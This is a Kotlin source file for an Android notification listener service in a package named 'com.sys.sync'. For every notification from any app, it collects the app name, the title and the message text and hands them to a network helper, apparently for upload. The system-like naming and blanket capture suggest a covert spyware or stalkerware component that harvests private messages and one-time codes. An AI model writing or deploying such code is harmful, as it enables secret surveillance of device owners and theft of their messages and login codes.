package com.sys.sync

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotifService : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        val ex = sbn.notification.extras
        val title = ex.getString("android.title") ?: ""
        val text = ex.getCharSequence("android.text")?.toString() ?: ""
        if (text.isNotBlank()) Net.add("notif", text, "$pkg|$title")
    }
}
